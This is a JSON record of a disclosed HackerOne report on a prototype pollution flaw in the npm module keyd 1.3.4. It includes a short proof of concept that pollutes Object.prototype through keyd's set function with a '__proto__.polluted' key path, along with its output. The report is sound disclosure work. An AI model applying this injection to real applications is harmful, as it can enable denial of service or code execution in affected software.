@@ -1,0 +1,124 @@
+{
+  "id": 877515,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84Nzc1MTU=",
+  "url": "https://hackerone.com/reports/877515",
+  "title": "[keyd] Prototype pollution",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2020-05-18T19:58:29.357Z",
+  "submitted_at": "2020-05-18T19:58:29.357Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "d3lla",
+    "url": "/d3lla",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-09-14T10:51:47.788Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-09-14T10:51:47.737Z",
+  "team_member_agreed_on_going_public_at": "2020-09-12T20:56:09.427Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I would like to report a `prototype pollution` vulnerability in `keyd` module.\nIt allows an attacker to inject properties on Object.prototype.\n\n# Module\n\n**module name:** `keyd`\n**version:** `1.3.4`\n**npm page:** `https://www.npmjs.com/package/keyd`\n\n## Module Description\n\nA small library for using and manipulating key paths in JavaScript.\n\n## Module Stats\n\n[71] weekly downloads\n\n# Vulnerability\n\n## Vulnerability Description\n\nThe `set` function can be used to add/modify properties of the Object prototype. These properties will be present on all objects.\n\n## Steps To Reproduce:\n- install `keyd` module:\n    - `npm i keyd`\n\nSet the `__proto__.polluted` property of an object:\n```javascript\n\nconst keyd = require('keyd');\nconst obj = {};\nconsole.log(\"Before : \" + obj.polluted);\nkeyd({}).set('__proto__.polluted', 'yes');\nconsole.log(\"After : \" + obj.polluted);\n```\nOutput:\n```console\n\nBefore : undefined\nAfter : yes\n```\n{F833532}\n\n## Supporting Material/References:\n\n- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\n- NODEJS VERSION: v14.1.0\n- NPM VERSION: 6.14.5\n\n# Wrap up\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N] \n\n\nThank you for your time.\n\nbest regards,\n\nd3lla\n\n## Impact\n\nThe impact depends on the application. In some cases it is possible to achieve Denial of service (DoS), Remote Code Execution, Property Injection.",
+  "weakness": {
+    "id": 106,
+    "name": "Modification of Assumed-Immutable Data (MAID)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 833532,
+      "file_name": "keyd_poc.mov",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/WJRYZqRyNoUBKzhRHrovCbPY?response-content-disposition=attachment%3B%20filename%3D%22keyd_poc.mov%22%3B%20filename%2A%3DUTF-8%27%27keyd_poc.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3VOAJ5JJ%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151750Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJHMEUCIDYMp37QsBNBxu1nn5awX6pl44hrWPc81aYLjOudT7CWAiEA3xmCbKgPpokj11LVwvXsNyDmj3zGNjdVHHqLd29MlWIqugUI5%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDFqnOI1hiucLvRgH%2BiqOBQEQXNq0tP%2Fqj8fScUTljgfvPSnT0BjJ1GS0AP0%2FMZiWQDTH%2BtdmOtEyA%2FWuAN9UJNatey1lUN3QlzYtLeF8L3bfLrHq86a0tbaqA8iCypAICC6BRLTyHwtz4ONL9jm6QEhOIiIElq4oVqFAVIhrQgCKghK0uQbf6xmwu2VciG8nywi4V14Rj1vOTeyvvh%2BWCRLonHV5xL2NY5kTbQinf2U48n2iGjzb1H3%2FcgoIDP9vKW2Q5A16vJELiMtKs2GBQFmr3S6FEalHjsC5bzhZsMED%2FXPnzTuN464ZdREHeocqG4jRx5x4LBzQ3F0a9PiV3vpMF6Kgp1KhCqBrCIHoB%2FoE0SM8JbRgEWW9rev0ku1JqfSfNAZnq2IJX38lkSBCi1tL%2BHeRzngNQlI0yM3YV967VAclhSFsa5cMX0e%2FjyBmjeMWIPMcdHZ2mzdM9Fa9SMdTDdAA3X0CfLr9ihAf48l0DA03R3cfr8U8uWCuymunj94xR6CWYkxoSQNdX8ymoItqYEVfSx84etz%2BfeBYG5VrZKQunM7wjjiJ%2FEKNmOKrfcg9HRsq2YyI3Woc0cKbZ%2FeBUOVdKjr8UtzhmosPoR%2BhHIJKF8XhPJvtGTJh6bxXniIe4RxlhAUU0Fnu28C79yktJF9TQNczdl%2F70NbgfJbK5Lhrr0qcg2Eb8X%2FImXWZLtP4Gu%2BLB2ECGIyrOI3yKKAsfQPQpoCL9jvKWDV5KuU4ueAtzBUxcA3ImPnPXNDPZe0ILs5LYhbKsJtfMwLFV%2BmRJWAXXWVKok3QE%2FOS6x4Ts%2B7emSF0Pm8ibXQL18SALBmNCFOMdHLlM%2B0yXdZL9bHYRpiMhSdyIEgRiRh%2BBm%2B663GJQukdgPbX37Ps0jDy7%2FzPBjqxAZh2UdjJYISEAf8m2DpheYNBlFoysBS8uq6btSNnbeUoOWlDLQmOLSLKvS6JbLp7NCJwRdiIuDHz8wIuDsEV4ZLtIq5RNrnuBOndf00a1jAb3ETW5JoqbXVlc5zqt3l6oMyfDXcGa6YsAKDYeeT7yQhfCZLtVyafdKlswCAEXFdTeeYTFQuv80dJYdprYIiSh%2BxUyxNujNp0BS%2FvU8LxXhzUWUs1Wlne0GGOn8I6gKHyMg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5270609aaa4ad47fbd8602c420d9402d82afec6715944bb63e4faecd616d2cbd",
+      "file_size": 336736,
+      "type": "video/quicktime",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-10-12T20:56:09.516Z",
+  "allow_singular_disclosure_after": -175803700.61081645,
+  "singular_disclosure_allowed": true,
+  "vote_count": 1,
+  "voters": [
+    "mtswenisannieboy"
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 2986,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "Other module",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
